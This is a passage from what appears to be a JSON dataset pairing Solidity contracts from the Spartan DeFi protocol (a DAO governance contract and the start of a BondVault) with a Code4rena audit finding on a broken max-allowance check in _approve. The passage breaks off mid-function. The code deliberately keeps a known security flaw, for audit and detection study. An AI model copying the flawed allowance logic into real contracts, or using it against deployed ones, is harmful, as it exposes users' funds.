access\n    modifier onlyDAO() {\n        require(msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base){\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        DAO = address(this);\n        coolOffPeriod = 259200;\n        erasToEarn = 30;\n        majorityFactor = 6666;\n        daoClaim = 1000;\n        daoFee = 100;\n        proposalCount = 0;\n        secondsPerEra = iBASE(BASE).secondsPerEra();\n    }\n\n    //==================================== PROTOCOL CONTRACTs SETTER =================================//\n\n    function setGenesisAddresses(address _router, address _utils, address _reserve) external onlyDAO {\n        _ROUTER = iROUTER(_router);\n        _UTILS = iUTILS(_utils);\n        _RESERVE = iRESERVE(_reserve);\n    }\n\n    function setVaultAddresses(address _daovault, address _bondvault, address _synthVault) external onlyDAO {\n        _DAOVAULT = iDAOVAULT(_daovault);\n        _BONDVAULT = iBONDVAULT(_bondvault);\n        _SYNTHVAULT = iSYNTHVAULT(_synthVault); \n    }\n    \n    function setFactoryAddresses(address _poolFactory, address _synthFactory) external onlyDAO {\n        _POOLFACTORY = iPOOLFACTORY(_poolFactory);\n        _SYNTHFACTORY = iSYNTHFACTORY(_synthFactory);\n    }\n\n    function setGenesisFactors(uint32 _coolOff, uint32 _daysToEarn, uint32 _majorityFactor, uint32 _daoClaim, uint32 _daoFee) external onlyDAO {\n        coolOffPeriod = _coolOff;\n        erasToEarn = _daysToEarn;\n        majorityFactor = _majorityFactor;\n        daoClaim = _daoClaim;\n        daoFee = _daoFee;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() external onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Can change vesting period for bonders\n    function changeBondingPeriod(uint256 bondingSeconds) external onlyDAO{\n        bondingPeriodSeconds = bondingSeconds;\n    }\n\n    //============================== USER - DEPOSIT/WITHDRAW ================================//\n\n    // User deposits LP tokens in the DAOVault\n    function deposit(address pool, uint256 amount) external {\n        depositLPForMember(pool, amount, msg.sender);\n    }\n\n    // Contract deposits LP tokens for member\n    function depositLPForMember(address pool, uint256 amount, address member) public {\n        require(_POOLFACTORY.isCuratedPool(pool) == true, \"!curated\"); // Pool must be Curated\n        require(amount > 0, \"!amount\"); // Deposit amount must be valid\n        if (isMember[member] != true) {\n            arrayMembers.push(member); // If not a member; add user to member array\n            isMember[member] = true; // If not a member; register the user as member\n        }\n        if((_DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        require(iBEP20(pool).transferFrom(msg.sender, address(_DAOVAULT), amount), \"!funds\"); // Send user's deposit to the DAOVault\n        _DAOVAULT.depositLP(pool, amount, member); // Update user's deposit balance & weight\n        mapMember_lastTime[member] = block.timestamp; // Reset user's last harvest time\n        emit MemberDeposits(member, pool, amount);\n    }\n    \n    // User withdraws all of their selected asset from the DAOVault\n    function withdraw(address pool) external {\n        removeVote(); // Users weight is removed from the current open DAO proposal\n        require(_DAOVAULT.withdraw(pool, msg.sender), \"!transfer\"); // User receives their withdrawal\n    }\n\n    //============================== REWARDS ================================//\n    \n    // User claims their DAOVault incentives\n    function harvest() public {\n        require(_RESERVE.emissions(), \"!emissions\"); // Reserve must have emissions turned on\n        uint reward = calcCurrentReward(msg.sender); // Calculate the user's claimable incentive\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)); // Get total BASE balance of RESERVE\n        uint daoReward = (reserve * daoClaim) / 10000; // Get DAO's share of BASE balance of RESERVE (max user claim amount)\n        if(reward > daoReward){\n            reward = daoReward; // User cannot claim more than the daoReward limit\n        }\n        _RESERVE.grantFunds(reward, msg.sender); // Send the claim to the user\n    }\n\n    // Calculate the user's current incentive-claim per era\n    function calcCurrentReward(address member) public view returns(uint){\n        uint secondsSinceClaim = block.timestamp - mapMember_lastTime[member]; // Get seconds passed since last claim\n        uint share = calcReward(member); // Get share of rewards for user\n        uint reward = (share * secondsSinceClaim) / secondsPerEra; // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address member) public view returns(uint){\n        uint weight = _DAOVAULT.getMemberWeight(member) + _BONDVAULT.getMemberWeight(member); // Get combined total weights (scope: user)\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total weights (scope: vaults)\n        uint reserve = iBEP20(BASE).balanceOf(address(_RESERVE)) / erasToEarn; // Aim to deplete reserve over a number of days\n        uint daoReward = (reserve * daoClaim) / 10000; // Get the DAO's share of that\n        return _UTILS.calcShare(weight, _totalWeight, daoReward); // Get users's share of that (1 era worth)\n    }\n\n    //================================ BOND Feature ==================================//\n\n    // Can burn the SPARTA remaining in this contract (Bond allocations held in the DAO)\n    function burnBalance() external onlyDAO returns (bool){\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBASE(BASE).burn(baseBal);   \n        return true;\n    }\n\n    // Can transfer the SPARTA remaining in this contract to a new DAO (If DAO is upgraded)\n    function moveBASEBalance(address newDAO) external onlyDAO {\n        uint256 baseBal = iBEP20(BASE).balanceOf(address(this));\n        iBEP20(BASE).transfer(newDAO, baseBal);\n    }\n\n    // List an asset to be enabled for Bonding\n    function listBondAsset(address asset) external onlyDAO {\n        if(!isListed[asset]){\n            isListed[asset] = true; // Register as a currently enabled asset\n            listedBondAssets.push(asset); // Add to historical record of past Bond assets\n        }\n        emit ListedAsset(msg.sender, asset);\n    }\n\n    // Delist an asset from the Bond program\n    function delistBondAsset(address asset) external onlyDAO {\n        isListed[asset] = false; // Unregister as a currently enabled asset\n        emit DelistedAsset(msg.sender, asset);\n    }\n\n    // User deposits assets to be Bonded\n    function bond(address asset, uint256 amount) external payable returns (bool success) {\n        require(amount > 0, '!amount'); // Amount must be valid\n        require(isListed[asset], '!listed'); // Asset must be listed for Bond\n        if (isMember[msg.sender] != true) {\n            arrayMembers.push(msg.sender); // If user is not a member; add them to the member array\n            isMember[msg.sender] = true; // Register user as a member\n        }\n        if((_DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender)) > 0) {\n            harvest(); // If member has existing weight; force harvest to block manipulation of lastTime + harvest\n        }\n        uint256 liquidityUnits = handleTransferIn(asset, amount); // Add liquidity and calculate LP units\n        _BONDVAULT.depositForMember(asset, msg.sender, liquidityUnits); // Deposit the Bonded LP units in the BondVault\n        mapMember_lastTime[msg.sender] = block.timestamp; // Reset user's last harvest time\n        emit DepositAsset(msg.sender, amount, liquidityUnits);\n        return true;\n    }\n\n    // Add Bonded assets as liquidity and calculate LP units\n    function handleTransferIn(address _token, uint _amount) internal returns (uint LPunits){\n        uint256 spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount); // Get the SPARTA swap value of the bonded assets\n        if(iBEP20(BASE).allowance(address(this), address(_ROUTER)) < spartaAllocation){\n            iBEP20(BASE).approve(address(_ROUTER), iBEP20(BASE).totalSupply()); // Increase SPARTA allowance if required\n        }\n        if(_token == address(0)){\n            require((_amount == msg.value), \"!amount\");\n            LPunits = _ROUTER.addLiquidityForMember{value:_amount}(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & BNB as liquidity to mint LP tokens\n        } else {\n            iBEP20(_token).transferFrom(msg.sender, address(this), _amount); // Transfer user's assets to Dao contract\n            if(iBEP20(_token).allowance(address(this), address(_ROUTER)) < _amount){\n                uint256 approvalTNK = iBEP20(_token).totalSupply();\n                iBEP20(_token).approve(address(_ROUTER), approvalTNK); // Increase allowance if required\n            }\n            LPunits = _ROUTER.addLiquidityForMember(spartaAllocation, _amount, _token, address(_BONDVAULT)); // Add spartaAllocation & assets as liquidity to mint LP tokens\n        } \n    }\n\n    // User claims all of their unlocked Bonded LPs\n    function claimAllForMember(address member) external returns (bool){\n        address [] memory listedAssets = listedBondAssets; // Get array of bond assets\n        for(uint i = 0; i < listedAssets.length; i++){\n            uint claimA = calcClaimBondedLP(member, listedAssets[i]); // Check user's unlocked Bonded LPs for each asset\n            if(claimA > 0){\n               _BONDVAULT.claimForMember(listedAssets[i], member); // Claim LPs if any unlocked\n            }\n        }\n        return true;\n    }\n\n    // User claims unlocked Bond units of a selected asset\n    function claimForMember(address asset) external returns (bool){\n        uint claimA = calcClaimBondedLP(msg.sender, asset); // Check user's unlocked Bonded LPs\n        if(claimA > 0){\n            _BONDVAULT.claimForMember(asset, msg.sender); // Claim LPs if any unlocked\n        }\n        return true;\n    }\n    \n    // Calculate user's unlocked Bond units of a selected asset\n    function calcClaimBondedLP(address bondedMember, address asset) public returns (uint){\n        uint claimAmount = _BONDVAULT.calcBondedLP(bondedMember, asset); // Check user's unlocked Bonded LPs\n        return claimAmount;\n    }\n\n    //============================== CREATE PROPOSALS ================================//\n\n    // New ID, but specify type, one type for each function call\n    // Votes counted to IDs\n    // IDs are finalised\n    // IDs are executed, but type specifies unique logic\n\n    // New DAO proposal: Simple action\n    function newActionProposal(string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: uint parameter\n    function newParamProposal(uint32 param, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_param[currentProposal] = param; // Set the proposed parameter\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Address parameter\n    function newAddressProposal(address proposedAddress, string memory typeStr) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        mapPID_address[currentProposal] = proposedAddress; // Set the proposed new address\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // New DAO proposal: Grant SPARTA to wallet\n    function newGrantProposal(address recipient, uint amount) external returns(uint) {\n        checkProposal(); // If no open proposal; construct new one\n        payFee(); // Pay SPARTA fee for new proposal\n        string memory typeStr = \"GRANT\";\n        mapPID_type[currentProposal] = typeStr; // Set the proposal type\n        mapPID_address[currentProposal] = recipient; // Set the proposed grant recipient\n        mapPID_param[currentProposal] = amount; // Set the proposed grant amount\n        emit NewProposal(msg.sender, currentProposal, typeStr);\n        return currentProposal;\n    }\n\n    // If no existing open DAO proposal; register a new one\n    function checkProposal() internal {\n        require(mapPID_open[currentProposal] == false, '!open'); // There must not be an existing open proposal\n        proposalCount += 1; // Increase proposal count\n        currentProposal = proposalCount; // Set current proposal to the new count\n        mapPID_open[currentProposal] = true; // Set new proposal as open status\n        mapPID_startTime[currentProposal] = block.timestamp; // Set the start time of the proposal to now\n    }\n    \n    // Pay the fee for a new DAO proposal\n    function payFee() internal returns(bool){\n        uint _amount = daoFee*(10**18); // Convert DAO fee to WEI\n        require(iBEP20(BASE).transferFrom(msg.sender, address(_RESERVE), _amount), '!fee'); // User pays the new proposal fee\n        return true;\n    } \n\n    //============================== VOTE && FINALISE ================================//\n\n    // Vote for a proposal\n    function voteProposal() external returns (uint voteWeight) {\n        require(mapPID_open[currentProposal] == true, \"!open\"); // Proposal must be open status\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeight = countVotes(); // Vote for proposal and recount\n        if(hasQuorum(currentProposal) && mapPID_finalising[currentProposal] == false){\n            if(isEqual(_type, 'DAO') || isEqual(_type, 'UTILS') || isEqual(_type, 'RESERVE') ||isEqual(_type, 'GET_SPARTA') || isEqual(_type, 'ROUTER') || isEqual(_type, 'LIST_BOND')|| isEqual(_type, 'GRANT')|| isEqual(_type, 'ADD_CURATED_POOL')){\n                if(hasMajority(currentProposal)){\n                    _finalise(); // Critical proposals require 'majority' consensus to enter finalization phase\n                }\n            } else {\n                _finalise(); // Other proposals require 'quorum' consensus to enter finalization phase\n            }\n        }\n        emit NewVote(msg.sender, currentProposal, voteWeight, mapPID_votes[currentProposal], string(_type));\n    }\n\n    // Remove vote from a proposal\n    function removeVote() public returns (uint voteWeightRemoved){\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        voteWeightRemoved = mapPIDMember_votes[currentProposal][msg.sender]; // Get user's current vote weight\n        if(mapPID_open[currentProposal]){\n            mapPID_votes[currentProposal] -= voteWeightRemoved; // Remove user's votes from propsal (scope: proposal)\n        }\n        mapPIDMember_votes[currentProposal][msg.sender] = 0; // Remove user's votes from propsal (scope: member)\n        emit RemovedVote(msg.sender, currentProposal, voteWeightRemoved, mapPID_votes[currentProposal], string(_type));\n        return voteWeightRemoved;\n    }\n\n    // Push the proposal into 'finalising' status\n    function _finalise() internal {\n        bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n        mapPID_finalising[currentProposal] = true; // Set finalising status to true\n        mapPID_coolOffTime[currentProposal] = block.timestamp; // Set timestamp to calc cooloff time from\n        emit ProposalFinalising(msg.sender, currentProposal, block.timestamp+coolOffPeriod, string(_type));\n    }\n\n    // Attempt to cancel the open proposal\n    function cancelProposal() external {\n        require(block.timestamp > (mapPID_startTime[currentProposal] + 1296000), \"!days\"); // Proposal must not be new\n        mapPID_votes[currentProposal] = 0; // Clear all votes from the proposal\n        mapPID_open[currentProposal] = false; // Set the proposal as not open (closed status)\n        emit CancelProposal(msg.sender, currentProposal);\n    }\n\n    // A finalising-stage proposal can be finalised after the cool off period\n    function finaliseProposal() external {\n        require((block.timestamp - mapPID_coolOffTime[currentProposal]) > coolOffPeriod, \"!cooloff\"); // Must be past cooloff period\n        require(mapPID_finalising[currentProposal] == true, \"!finalising\"); // Must be in finalising stage\n        if(!hasQuorum(currentProposal)){\n            mapPID_finalising[currentProposal] = false; // If proposal has lost quorum consensus; kick it out of the finalising stage\n        } else {\n            bytes memory _type = bytes(mapPID_type[currentProposal]); // Get the proposal type\n            if(isEqual(_type, 'DAO')){\n                moveDao(currentProposal);\n            } else if (isEqual(_type, 'ROUTER')) {\n                moveRouter(currentProposal);\n            } else if (isEqual(_type, 'UTILS')){\n                moveUtils(currentProposal);\n            } else if (isEqual(_type, 'RESERVE')){\n                moveReserve(currentProposal);\n            } else if (isEqual(_type, 'FLIP_EMISSIONS')){\n                flipEmissions(currentProposal);\n            } else if (isEqual(_type, 'COOL_OFF')){\n                changeCooloff(currentProposal);\n            } else if (isEqual(_type, 'ERAS_TO_EARN')){\n                changeEras(currentProposal);\n            } else if (isEqual(_type, 'GRANT')){\n                grantFunds(currentProposal);\n            } else if (isEqual(_type, 'GET_SPARTA')){\n                _increaseSpartaAllocation(currentProposal);\n            } else if (isEqual(_type, 'LIST_BOND')){\n                _listBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'DELIST_BOND')){\n                _delistBondingAsset(currentProposal);\n            } else if (isEqual(_type, 'ADD_CURATED_POOL')){\n                _addCuratedPool(currentProposal);\n            } else if (isEqual(_type, 'REMOVE_CURATED_POOL')){\n                _removeCuratedPool(currentProposal);\n            } \n        }\n    }\n\n    // Change the DAO to a new contract address\n    function moveDao(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        DAO = _proposedAddress; // Change the DAO to point to the new DAO address\n        iBASE(BASE).changeDAO(_proposedAddress); // Change the BASE contract to point to the new DAO address\n        daoHasMoved = true; // Set status of this old DAO\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the ROUTER to a new contract address\n    function moveRouter(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _ROUTER = iROUTER(_proposedAddress); // Change the DAO to point to the new ROUTER address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the UTILS to a new contract address\n    function moveUtils(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _UTILS = iUTILS(_proposedAddress); // Change the DAO to point to the new UTILS address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change the RESERVE to a new contract address\n    function moveReserve(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new address\n        require(_proposedAddress != address(0), \"!address\"); // Proposed address must be valid\n        _RESERVE = iRESERVE(_proposedAddress); // Change the DAO to point to the new RESERVE address\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Flip the BASE emissions on/off\n    function flipEmissions(uint _proposalID) internal {\n        iBASE(BASE).flipEmissions(); // Toggle emissions on the BASE contract\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change cool off period (Period of time until a finalising proposal can be finalised)\n    function changeCooloff(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        coolOffPeriod = _proposedParam; // Change coolOffPeriod\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Change erasToEarn (Used to regulate the incentives flow)\n    function changeEras(uint _proposalID) internal {\n        uint256 _proposedParam = mapPID_param[_proposalID]; // Get the proposed new param\n        require(_proposedParam != 0, \"!param\"); // Proposed param must be valid\n        erasToEarn = _proposedParam; // Change erasToEarn\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Grant SPARTA to the proposed recipient\n    function grantFunds(uint _proposalID) internal {\n        uint256 _proposedAmount = mapPID_param[_proposalID]; // Get the proposed SPARTA grant amount\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed SPARTA grant recipient\n        require(_proposedAmount != 0, \"!param\"); // Proposed grant amount must be valid\n        require(_proposedAddress != address(0), \"!address\"); // Proposed recipient must be valid\n        _RESERVE.grantFunds(_proposedAmount, _proposedAddress); // Grant the funds to the recipient\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Mint a 2.5M SPARTA allocation for the Bond program\n    function _increaseSpartaAllocation(uint _proposalID) internal {\n        uint256 _2point5m = 2.5*10**6*10**18; //_2.5m\n        iBASE(BASE).mintFromDAO(_2point5m, address(this)); // Mint SPARTA and send to DAO to hold\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // List an asset to be enabled for Bonding\n    function _listBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        if(!isListed[_proposedAddress]){\n            isListed[_proposedAddress] = true; // Register asset as listed for Bond\n            listedBondAssets.push(_proposedAddress); // Add asset to array of listed Bond assets\n        }\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Delist an asset from being allowed to Bond\n    function _delistBondingAsset(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        isListed[_proposedAddress] = false; // Unregister asset as listed for Bond (Keep it in the array though; as this is used in the UI)\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Add a pool as 'Curated' to enable synths, weight and incentives\n    function _addCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed new asset\n        _POOLFACTORY.addCuratedPool(_proposedAddress); // Add the pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n\n    // Remove a pool from Curated status\n    function _removeCuratedPool(uint _proposalID) internal {\n        address _proposedAddress = mapPID_address[_proposalID]; // Get the proposed asset for removal\n        _POOLFACTORY.removeCuratedPool(_proposedAddress); // Remove pool as Curated\n        completeProposal(_proposalID); // Finalise the proposal\n    }\n    \n    // After completing the proposal's action; close it\n    function completeProposal(uint _proposalID) internal {\n        string memory _typeStr = mapPID_type[_proposalID]; // Get proposal type\n        emit FinalisedProposal(msg.sender, _proposalID, mapPID_votes[_proposalID], _DAOVAULT.totalWeight(), _typeStr);\n        mapPID_votes[_proposalID] = 0; // Reset proposal votes to 0\n        mapPID_finalised[_proposalID] = true; // Finalise the proposal\n        mapPID_finalising[_proposalID] = false; // Remove proposal from 'finalising' stage\n        mapPID_open[_proposalID] = false; // Close the proposal\n    }\n\n    //============================== CONSENSUS ================================//\n    \n    // Add user's total weight to proposal and recount\n    function countVotes() internal returns (uint voteWeight){\n        mapPID_votes[currentProposal] -= mapPIDMember_votes[currentProposal][msg.sender]; // Remove user's current votes from the open proposal\n        voteWeight = _DAOVAULT.getMemberWeight(msg.sender) + _BONDVAULT.getMemberWeight(msg.sender); // Get user's combined total weights\n        mapPID_votes[currentProposal] += voteWeight; // Add user's total weight to the current open proposal (scope: proposal)\n        mapPIDMember_votes[currentProposal][msg.sender] = voteWeight; // Add user's total weight to the current open proposal (scope: member)\n        return voteWeight;\n    }\n\n    // Check if a proposal has Majority consensus\n    function hasMajority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight() + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight * majorityFactor / 10000; // Majority > 66.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Quorum consensus\n    function hasQuorum(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 2; // Quorum > 50%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    // Check if a proposal has Minority consensus\n    function hasMinority(uint _proposalID) public view returns(bool){\n        uint votes = mapPID_votes[_proposalID]; // Get the proposal's total voting weight\n        uint _totalWeight = _DAOVAULT.totalWeight()  + _BONDVAULT.totalWeight(); // Get combined total vault weights\n        uint consensus = _totalWeight / 6; // Minority > 16.6%\n        if(votes > consensus){\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    //======================================PROTOCOL CONTRACTs GETTER=================================//\n    \n    // Get the ROUTER address that the DAO currently points to\n    function ROUTER() public view returns(iROUTER){\n        if(daoHasMoved){\n            return Dao(DAO).ROUTER();\n        } else {\n            return _ROUTER;\n        }\n    }\n\n    // Get the UTILS address that the DAO currently points to\n    function UTILS() public view returns(iUTILS){\n        if(daoHasMoved){\n            return Dao(DAO).UTILS();\n        } else {\n            return _UTILS;\n        }\n    }\n\n    // Get the BONDVAULT address that the DAO currently points to\n    function BONDVAULT() public view returns(iBONDVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).BONDVAULT();\n        } else {\n            return _BONDVAULT;\n        }\n    }\n\n    // Get the DAOVAULT address that the DAO currently points to\n    function DAOVAULT() public view returns(iDAOVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).DAOVAULT();\n        } else {\n            return _DAOVAULT;\n        }\n    }\n\n    // Get the POOLFACTORY address that the DAO currently points to\n    function POOLFACTORY() public view returns(iPOOLFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).POOLFACTORY();\n        } else {\n            return _POOLFACTORY;\n        }\n    }\n\n    // Get the SYNTHFACTORY address that the DAO currently points to\n    function SYNTHFACTORY() public view returns(iSYNTHFACTORY){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHFACTORY();\n        } else {\n            return _SYNTHFACTORY;\n        }\n    }\n\n    // Get the RESERVE address that the DAO currently points to\n    function RESERVE() public view returns(iRESERVE){\n        if(daoHasMoved){\n            return Dao(DAO).RESERVE();\n        } else {\n            return _RESERVE;\n        }\n    }\n\n    // Get the SYNTHVAULT address that the DAO currently points to\n    function SYNTHVAULT() public view returns(iSYNTHVAULT){\n        if(daoHasMoved){\n            return Dao(DAO).SYNTHVAULT();\n        } else {\n            return _SYNTHVAULT;\n        }\n    }\n\n    //============================== HELPERS ================================//\n    \n    function memberCount() external view returns(uint){\n        return arrayMembers.length;\n    }\n\n    function getProposalDetails(uint proposalID) external view returns (ProposalDetails memory proposalDetails){\n        proposalDetails.id = proposalID;\n        proposalDetails.proposalType = mapPID_type[proposalID];\n        proposalDetails.votes = mapPID_votes[proposalID];\n        proposalDetails.coolOffTime = mapPID_coolOffTime[proposalID];\n        proposalDetails.finalising = mapPID_finalising[proposalID];\n        proposalDetails.finalised = mapPID_finalised[proposalID];\n        proposalDetails.param = mapPID_param[proposalID];\n        proposalDetails.proposedAddress = mapPID_address[proposalID];\n        proposalDetails.open = mapPID_open[proposalID];\n        proposalDetails.startTime = mapPID_startTime[proposalID];\n        return proposalDetails;\n    }\n\n    function assetListedCount() external view returns (uint256 count){\n        return listedBondAssets.length;\n    }\n\n    function allListedAssets() external view returns (address[] memory _allListedAssets){\n        return listedBondAssets;\n    }\n    \n    function isEqual(bytes memory part1, bytes memory part2) private pure returns(bool){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n\n   \n\n",
        "CodeNames": [
            "Pool.sol",
            "Dao.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-02",
                "Location": [
                    "approveAndCall",
                    "_approve",
                    "// No need to re-approve if already max",
                    "type(uint"
                ],
                "Type": "  Pool.sol  &  Synth.sol : Failing Max Value Allowance",
                "Description": "\nIn the _approve function, if the allowance passed in is type(uint256).max, nothing happens (ie. allowance will still remain at previous value). Contract integrations (DEXes for example) tend to hardcode this value to set maximum allowance initially, but this will result in zero allowance given instead.\n\nThis also makes the comment // No need to re-approve if already max misleading, because the max allowance attainable is type(uint256).max 1, and re-approval does happen in this case.\n\nThis affects the approveAndCall implementation since it uses type(uint256).max as the allowance amount, but the resulting allowance set is zero.\n\n",
                "Repair": "Recommend keeping it simple and removing the condition.\n\njsx\nfunction _approve(address owner, address spender, uint256 amount) internal virtual {\n    require(owner != address(0), \"!owner\");\n    require(spender != address(0), \"!spender\");\n    _allowances[owner][spender] = amount;\n    emit Approval(owner, spender, amount);\n}\n\n\nSamusElderg (Spartan) confirmed(https://github.com/code-423n4/2021-07-spartan-findings/issues/29#issuecomment-885456808):\n  We acknowledge the issue in the max approval for approveAndCall, which we don't use.\n Furthermore, the issue is only a problem if a user directly approves a maximum possible amount which would mean they are assuming trust in the contract.\n\n We will also change _approve in the pool and synth contracts.\n Risk, as outlined above, is low.\n\nghoul-sol (judge) commented(https://github.com/code-423n4/2021-07-spartan-findings/issues/29#issuecomment-894851446):\n  This is high risk as explained in #152\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iROUTER.sol\";\nimport \"./interfaces/iPOOL.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\n\ncontract BondVault {\n    address public BASE;\n    address public DEPLOYER;\n    uint256 public totalWeight;\n    bool private bondRelease;\n    address [] public arrayMembers;\n\n    struct ListedAssets {\n        bool isListed;\n        address[] members;\n        mapping(address => bool) isMember;\n        mapping(address => uint256) bondedLP;\n        mapping(address => uint256) claimRate;\n        mapping(address => uint256) lastBlockTime;\n    }\n    struct MemberDetails {\n        bool isMember;\n        uint256 bondedLP;\n        uint256 claimRate;\n        uint256 lastBlockTime;\n    }\n\n    mapping(address => ListedAssets) public mapBondAsset_memberDetails;\n    mapping(address => uint256) private mapMember_weight; // Value of users weight (scope: user)\n    mapping(address => mapping(address => uint256)) private mapMemberPool_weight; // Value of users weight (scope: pool)\n\n    constructor (address _base) {\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        bondRelease = false;\n    }\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == _DAO().DAO() || msg.sender == DEPLOYER);\n        _;\n    }\n\n    // Can purge deployer once DAO is stable and final\n    function purgeDeployer() public onlyDAO {\n        DEPLOYER = address(0);\n    }\n\n    // Get the current DAO address as reported by the BASE contract\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    // Deposit LPs in the BondVault for a user (Called from DAO)\n    function depositForMember(address asset, address member, uint LPS) external onlyDAO returns(bool){\n        if(!mapBondAsset_memberDetails[asset].isMember[member]){\n            mapBondAsset_memberDetails[asset].isMember[member] = true; // Register user as member (scope: user -> asset)\n            arrayMembers.push(member); // Add user to member array (scope: vault)\n            mapBondAsset_memberDetails[asset].members.push(member); // Add user to member array (scope: user -> asset)\n        }\n        if(mapBondAsset_memberDetails[asset].bondedLP[member] != 0){\n            claimForMember(asset, member); // Force claim if member has an existing remainder\n        }\n        mapBondAsset_memberDetails[asset].bondedLP[member] += LPS; // Add new deposit to users remainder\n        mapBondAsset_memberDetails[asset].lastBlockTime[member] = block.timestamp; // Set lastBlockTime to current time\n        mapBondAsset_memberDetails[asset].claimRate[member] = mapBondAsset_memberDetails[asset].bondedLP[member] / iDAO(_DAO().DAO()).bondingPeriodSeconds(); // Set claim rate per second\n        increaseWeight(asset, member); // Update user's weight\n        return true;\n    }\n\n    // Increase user's weight in the BondVault\n    function increaseWeight(address asset, address member) internal{\n        address pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(asset); // Get pool address\n        if (mapMemberPool_weight[member][pool] > 0) {\n            totalWeight -= mapMemberPool_weight[member][pool]; // Remove user weight from totalWeight (scope: vault)\n            mapMember_weight[member] -= mapMemberPool_weight[member][pool]; // Remove user weight from totalWeight (scope: user)\n            